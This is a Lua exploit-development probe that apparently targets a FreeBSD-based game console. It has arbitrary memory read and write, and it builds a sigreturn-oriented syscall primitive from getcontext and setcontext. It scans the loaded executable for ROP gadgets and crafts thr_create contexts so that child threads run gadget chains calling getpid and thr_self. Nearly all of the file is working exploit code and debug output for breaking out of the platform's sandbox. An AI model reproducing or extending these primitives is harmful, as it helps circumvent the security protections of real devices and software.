-- CRASH_CLASS: LOW
-- PROBE 185b: Test if child thread can call syscalls directly
--
-- 185a hung after thr_create. Need to verify child thread syscall execution.
-- Plan: create child thread that calls getpid (simple, returns immediately)
-- and writes result to a marker. Compare with main thread's getpid.

print("=== 185b: CHILD SYSCALL TEST ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end
local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local brip = rq(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("sc_addr=" .. hex64(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    wq(ctx + MC + 0xA0, sc_addr)
    wq(ctx + MC + 0x38, uint64(num))
    if a1 then wq(ctx + MC + 0x08, a1) end
    if a2 then wq(ctx + MC + 0x10, a2) end
    if a3 then wq(ctx + MC + 0x18, a3) end
    if a4 then wq(ctx + MC + 0x50, a4) end
    if a5 then wq(ctx + MC + 0x28, a5) end
    if a6 then wq(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Get eboot base and find gadgets
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108)
local eb_hi = rd(info + 0x10C)
print("eboot=0x" .. string.format("%X%08X", eb_hi, eb_lo))

-- Find "mov [rdi], rax; ret" (48 89 07 C3) in eboot
local mov_rdi_rax_ret = nil
for off = 0, 0x200000, 1 do
    local ok, b = pcall(function() return memory.read_dword(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
    if not ok then break end
    if to_num(b) == 0xC3078948 then
        mov_rdi_rax_ret = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
        print("mov_rdi_rax_ret=" .. hex64(mov_rdi_rax_ret) .. " @0x" .. string.format("%X", off))
        break
    end
end

-- Find EB FE (jmp $)
local jmp_self = nil
for off = 0, 0x200000, 1 do
    local ok, b = pcall(function() return memory.read_byte(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))) end)
    if not ok then break end
    if to_num(b) == 0xEB then
        local ok2, b2 = pcall(function() return memory.read_byte(uint64(string.format("0x%X%08X", eb_hi, eb_lo + off + 1))) end)
        if ok2 and to_num(b2) == 0xFE then
            jmp_self = uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
            print("jmp_self=" .. hex64(jmp_self))
            break
        end
    end
end

if not mov_rdi_rax_ret or not jmp_self then
    print("GADGETS NOT FOUND")
    return
end

-- === TEST 1: Child writes marker via mov [rdi], rax; ret → jmp $ ===
print("")
print("--- TEST 1: CHILD WRITES MARKER ---")

local MARKER = 0x10000
wq(gpu + MARKER, uint64(0))

-- Stack: [RSP+0] = jmp_self (where ret goes after mov [rdi], rax)
local STACK_TOP = 0x24000 - 8
wq(gpu + STACK_TOP, jmp_self)

-- thr_create context
local TC = 0x30000
for i = 0, 0x4FF, 8 do wq(gpu + TC + i, uint64(0)) end

-- Gates
wq(gpu + TC + 0x108, uint64(0x480))
wd(gpu + TC + 0x0D0, 0)
wq(gpu + TC + 0x110, uint64(0x10000))

-- Segments
wd(gpu + TC + 0x0C0, 0x43)
wd(gpu + TC + 0x100, 0x3B)

-- Entry: mov [rdi], rax; ret
wq(gpu + TC + 0x0E0, mov_rdi_rax_ret)

-- Stack
wq(gpu + TC + 0x0F8, ga(STACK_TOP))

-- Registers: RDI=marker addr, RAX=0xCAFEBABE
wq(gpu + TC + 0x048, ga(MARKER))          -- RDI
wq(gpu + TC + 0x078, uint64(0xCAFEBABE))  -- RAX

local tid_buf = memory.alloc(8)
wd(tid_buf, 0)
local rv = srop(430, ga(TC), uint64(tid_buf))
local cr = rv and to_num(rv) or -999
local ct = rd(tid_buf)
print("thr_create=" .. cr .. " tid=0x" .. string.format("%X", ct))

-- Wait 20ms
local TS = 0x28000
wq(gpu + TS, uint64(0))
wq(gpu + TS + 8, uint64(20000000))
srop(240, ga(TS), uint64(0))

-- Check marker
local m = rq(gpu + MARKER)
print("marker=" .. hex64(m))
if to_num(m) == 0xCAFEBABE then
    print("!!! CHILD WROTE MARKER CORRECTLY !!!")
end

-- Check child alive
if ct > 0 then
    rv = srop(431, uint64(ct), uint64(0))
    print("child_alive=" .. (rv and to_num(rv) or -999))
end

-- === TEST 2: Child calls getpid via syscall ===
print("")
print("--- TEST 2: CHILD CALLS GETPID ---")

-- Strategy: child does syscall(getpid=20), RAX has result
-- Then child does mov [rdi], rax; ret → jmp $
-- But we can't chain two instructions...
--
-- Alternative: use a two-gadget chain on the stack:
-- Child RIP = syscall; ret
-- [RSP] = address of "mov [rdi], rax; ret"
-- [RSP+8] = jmp_self
--
-- After syscall returns: RAX = getpid result
-- ret pops mov_rdi_rax_ret into RIP
-- mov [rdi], rax writes getpid to marker
-- ret pops jmp_self into RIP → spins

local MARKER2 = 0x11000
wq(gpu + MARKER2, uint64(0))

-- Stack: ret chain
local ST2 = 0x25000 - 16
wq(gpu + ST2, mov_rdi_rax_ret)  -- [RSP+0]: after syscall ret → mov [rdi], rax; ret
wq(gpu + ST2 + 8, jmp_self)     -- [RSP+8]: after mov ret → jmp $

-- Context
local TC2 = 0x32000
for i = 0, 0x4FF, 8 do wq(gpu + TC2 + i, uint64(0)) end
wq(gpu + TC2 + 0x108, uint64(0x480))
wd(gpu + TC2 + 0x0D0, 0)
wq(gpu + TC2 + 0x110, uint64(0x10000))
wd(gpu + TC2 + 0x0C0, 0x43)
wd(gpu + TC2 + 0x100, 0x3B)
wq(gpu + TC2 + 0x0E0, sc_addr)            -- RIP = syscall; ret
wq(gpu + TC2 + 0x0F8, ga(ST2))            -- RSP
wq(gpu + TC2 + 0x048, ga(MARKER2))        -- RDI = marker (preserved across syscall? No!)
wq(gpu + TC2 + 0x078, uint64(20))         -- RAX = 20 (getpid)

-- Problem: RDI is arg1 to getpid, and getpid ignores args, but
-- after syscall returns RAX=pid but RDI might be clobbered
-- Actually on FreeBSD syscall convention, RDI is preserved across syscall
-- (callee-saved behavior of the kernel entry path)

wd(tid_buf, 0)
rv = srop(430, ga(TC2), uint64(tid_buf))
cr = rv and to_num(rv) or -999
ct = rd(tid_buf)
print("thr_create=" .. cr .. " tid=0x" .. string.format("%X", ct))

srop(240, ga(TS), uint64(0))  -- 20ms wait

local m2 = rq(gpu + MARKER2)
print("marker2=" .. hex64(m2))
local expected_pid = to_num(make_syscall(20)())
print("expected_pid=" .. expected_pid)
if to_num(m2) == expected_pid then
    print("!!! CHILD CALLED GETPID SUCCESSFULLY !!!")
end

if ct > 0 then
    rv = srop(431, uint64(ct), uint64(0))
    print("child2_alive=" .. (rv and to_num(rv) or -999))
end

-- === TEST 3: Child calls thr_self to get its own TID ===
print("")
print("--- TEST 3: CHILD CALLS THR_SELF ---")

local MARKER3 = 0x12000
wq(gpu + MARKER3, uint64(0))

-- thr_self(432) writes tid to *arg1 (RDI)
-- So: RAX=432, RDI=marker_addr
-- After syscall: marker has child's TID, RAX=0 (success)
-- Then ret → but we need to check marker, not RAX

local ST3 = 0x26000 - 8
wq(gpu + ST3, jmp_self)

local TC3 = 0x34000
for i = 0, 0x4FF, 8 do wq(gpu + TC3 + i, uint64(0)) end
wq(gpu + TC3 + 0x108, uint64(0x480))
wd(gpu + TC3 + 0x0D0, 0)
wq(gpu + TC3 + 0x110, uint64(0x10000))
wd(gpu + TC3 + 0x0C0, 0x43)
wd(gpu + TC3 + 0x100, 0x3B)
wq(gpu + TC3 + 0x0E0, sc_addr)
wq(gpu + TC3 + 0x0F8, ga(ST3))
wq(gpu + TC3 + 0x048, ga(MARKER3))        -- RDI = output addr
wq(gpu + TC3 + 0x078, uint64(432))        -- RAX = thr_self

wd(tid_buf, 0)
rv = srop(430, ga(TC3), uint64(tid_buf))
cr = rv and to_num(rv) or -999
ct = rd(tid_buf)
print("thr_create=" .. cr .. " tid=0x" .. string.format("%X", ct))

srop(240, ga(TS), uint64(0))  -- 20ms wait

local m3 = rd(gpu + MARKER3)
print("child_tid_from_create=0x" .. string.format("%X", ct))
print("child_tid_from_thr_self=0x" .. string.format("%X", m3))
if m3 == ct and m3 ~= 0 then
    print("!!! CHILD SYSCALLS WORK !!!")
end

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
